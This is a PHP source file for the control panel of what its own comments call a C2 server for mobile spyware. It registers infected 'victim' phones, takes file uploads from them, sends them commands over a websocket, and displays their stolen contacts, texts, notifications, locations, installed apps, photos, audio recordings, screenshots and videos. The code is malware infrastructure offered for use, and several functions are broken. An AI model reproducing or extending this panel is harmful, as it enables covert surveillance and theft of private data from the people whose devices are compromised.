<?php

namespace Server\Controller;

use Locale;
use Server\Model\Client;
use Server\Controller\Base;
use Server\Library\WebSocketClient;
use Server\Model\Contact;
use Server\Model\Image;
use Server\Model\InstalledApp;
use Server\Model\Location;
use Server\Model\Message;
use Server\Model\Notification;
use Server\Model\Recording;
use Server\Model\Screenshot;
use Server\Model\Video;
use WebSocket\Client as TextTalkWebSocket;

use function Server\Library\render;

class ControlPanel extends Base
{
    /** @var string $webSocketURI Web Socket URI */
    private string $webSocketURI = "ws://localhost:8080";

    private WebSocketClient $socketClient;

    public function __construct(WebSocketClient $webSocketClient)
    {
        parent::__construct();
        $this->socketClient = $webSocketClient;
    }

    /**
     * C2 home page
     */
    public function home(): void
    {
        $clients = $this->getClients();
        render('home.php', ['clients' => $clients]);
    }

    /**
     * Get victim's contacts
     */
    public function contacts(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        $contacts = $this->getContacts($_GET['client']);
        render('features/contacts.php', ['contacts' => $contacts]);
    }

    /**
     * Get victim's image(s)
     */
    public function images(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        if ($this->isVictimPropertyIdSet()) {
            $query = "SELECT * FROM IMAGE WHERE client_id=? AND id=?";
            $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);

            
        }

        $images = $this->getImages($_GET['client']);
        render('features/images.php', ['images' => $images]);
    }

    /**
     * Get victim's installed application
     */
    public function installedApps(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        $installedApps = $this->getInstalledApps($_GET['client']);
        render('features/apps.php', ['installedApps' => $installedApps]);
    }

    /**
     * Get victim's known location(s)
     */
    public function location(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        $knownLocations = $this->getKnownLocations($_GET['client']);
        render('features/location.php', ['knownLocations' => $knownLocations]);
    }

    /**
     * Get victim's text messages
     */
    public function messages(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        $messages = $this->getMessages($_GET['client']);
        render('features/messages.php', ['messages' => $messages]);
    }

    /**
     * Get victim's notifications
     */
    public function notifications(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        $notifications = $this->getNotifications($_GET['client']);
        render('features/notifications.php', ['notifications' => $notifications]);
    }

    /**
     * Get victim's audio recording(s)
     */
    public function recordings(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        if (isset($_GET['id'])) {
        
        }

        $recordings = $this->getRecordings($_GET['client']);
        render('features/recordings.php', ['recordings' => $recordings]);
    }

    /**
     * Get victim's screenshot(s)
     */
    public function screenshots(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        if (isset($_GET['id'])) {

        }

        $screenshots = $this->getScreenshots($_GET['screenshots']);
        render('features/screeshots.php', ['screenshots' => $screenshots]);
    }

    /**
     * Get victim's video(s)
     */
    public function videos(): void
    {
        if (!$this->isClientIdSet())
            header("/");

        if (isset($_GET['id'])) {
        
        }

        $videos = $this->getVideos($_GET['client']);
        render('features/videos.php', ['videos' => $videos]);
    }

    /**
     * Register a client
     * 
     * @return string
     */
    public function createClient(): string
    {
        if (!isset($_POST['phone']))
            return null;

        if (!isset($_POST['device_api']))
            return null;

        if (!isset($_POST['device_id']))
            return null;

        if (!isset($_POST['device_model']))
            return null;

        if (!isset($_POST['ip_address']))
            return null;

        $query = "INSERT INTO CLIENT(model, device_id, ip_address, device_api, phone) VALUES(?, ?, ?, ?, ?)";
        $data = [
            $_POST['device_model'],
            $_POST['device_id'],
            $_POST['ip_address'],
            $_POST['device_api'],
            $_POST['phone']
        ];
        $this->database->insert($query, $data);

        $query = "SELECT * FROM CLIENT WHERE model=? AND device_id=? AND phone=?";
        $data = [
            $_POST['device_model'],
            $_POST['device_id'],
            $_POST['phone']
        ];
        $rows = $this->database->select($query, $data);
        $response = [];
        foreach ($response as $data) {
            $response['client_id'] = $data['id'];
            break;
        }

        return json_encode($response);
    }

    /**
     * Upload files from victim
     */
    public function upload(string $type): void
    {
        $destination = __DIR__ . "/../../../files/" . $type . "/";

        if(isset($_FILES['file'])) {
            $file_name = $_FILES['file']['name'];
            $file_tmp = $_FILES['file']['tmp_name'];
            
            move_uploaded_file($file_tmp, $destination . $file_name);
        }
    }

    /**
     * Send command to web socket server
     */
    public function sendCommand(): void
    {
        if (!isset($_POST['cmd']))
            return;

        $client = new TextTalkWebSocket($this->webSocketURI);

        try {
            // Connect to the WebSocket server
            $client->connect();
        
            // Send a message
            $client->send(json_encode($_POST));
        
            // Close the WebSocket connection
            $client->close();
        } catch (\Exception $e) {
            echo "Error: " . $e->getMessage() . "\n";
        }
    }

    /**
     * Get victims
     * 
     * @return array<Client>
     */
    private function getClients(): array
    {
        $clients = [];
        $query = "SELECT * FROM CLIENT";
        $rows = $this->database->select($query, []);

        foreach ($rows as $row) {
            $output = Client::parse($row);
            if (!is_null($output))
                $clients[] = $output;
        }

        return $clients;
    }

     /**
     * Get victim's contacts
     * @param int $victimID
     * 
     * @return array<Contact>
     */
    private function getContacts(int $victimID): array
    {
        $contacts = [];
        $query = "SELECT * FROM CONTACT WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $contacts = new Contact(
                $row['id'],
                $row['client_id'],
                $row['name'],
                $row['number']
            );
        }

        return $contacts;
    }

     /**
     * Get victim's images
     * @param int $victimID
     * 
     * @return array<Image>
     */
    private function getImages(int $victimID): array
    {
        $images = [];
        $query = "SELECT * FROM IMAGE WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $images = new Image(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $images;
    }

     /**
     * Get victim's installed applications
     * @param int $victimID
     * 
     * @return array<InstalledApp>
     */
    private function getInstalledApps(int $victimID): array
    {
        $installedApps = [];
        $query = "SELECT * FROM INSTALLED_APP WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $installedApps = new InstalledApp(
                $row['id'],
                $row['client_id'],
                $row['package_name'],
                $row['app_name']
            );
        }

        return $installedApps;
    }

     /**
     * Get victim's known locations
     * @param int $victimID
     * 
     * @return array<Location>
     */
    private function getKnownLocations(int $victimID): array
    {
        $knownLocations = [];
        $query = "SELECT * FROM LOCATION WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $knownLocations = new Location(
                $row['id'],
                $row['client_id'],
                $row['latitude'],
                $row['longitude'],
                $row['altitude'],
                $row['timestamp']
            );
        }

        return $knownLocations;
    }

     /**
     * Get victim's messages
     * @param int $victimID
     * 
     * @return array<Message>
     */
    private function getMessages(int $victimID): array
    {
        $messages = [];
        $query = "SELECT * FROM MESSAGE WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $messages = new Message(
                $row['id'],
                $row['client_id'],
                $row['sender'],
                $row['content'],
                $row['timestamp']
            );
        }

        return $messages;
    }

     /**
     * Get victim's notifications
     * @param int $victimID
     * 
     * @return array<Notification>
     */
    private function getNotifications(int $victimID): array
    {
        $notifications = [];
        $query = "SELECT * FROM NOTIFICATION WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $messages = new Notification(
                $row['id'],
                $row['client_id'],
                $row['sender'],
                $row['content'],
                $row['timestamp']
            );
        }

        return $notifications;
    }

     /**
     * Get victim's recordings
     * @param int $victimID
     * 
     * @return array<Recording>
     */
    private function getRecordings(int $victimID): array
    {
        $recordings = [];
        $query = "SELECT * FROM RECORDING WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $recordings = new Recording(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $recordings;
    }

     /**
     * Get victim's screenshots
     * @param int $victimID
     * 
     * @return array<Screenshot>
     */
    private function getScreenshots(int $victimID): array
    {
        $screenshots = [];
        $query = "SELECT * FROM SCREENSHOT WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $screenshots = new Screenshot(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $screenshots;
    }

     /**
     * Get victim's videos
     * @param int $victimID
     * 
     * @return array<Video>
     */
    private function getVideos(int $victimID): array
    {
        $videos = [];
        $query = "SELECT * FROM VIDEO WHERE client_id=?";
        $rows = $this->database->select($query, [$victimID]);

        foreach ($rows as $row) {
            $videos = new Video(
                $row['id'],
                $row['client_id'],
                $row['filename'],
                $row['timestamp']
            );
        }

        return $videos;
    }

    /**
     * Check if the victim's ID is passed as a GET parameter
     * 
     * @return bool
     */
    private function isClientIdSet(): bool
    {
        if (!isset($_GET['client']))
            return false;

        if (!is_int($_GET['client'])) 
            return false;

        return true;
    }

    /**
     * Check if the victim's property ID is passed as a GET parameter
     * 
     * @return bool
     */
    private function isVictimPropertyIdSet(): bool
    {
        if (!isset($_GET['id']))
            return false;

        if (!is_int($_GET['id'])) 
            return false;

        return true;
    }
}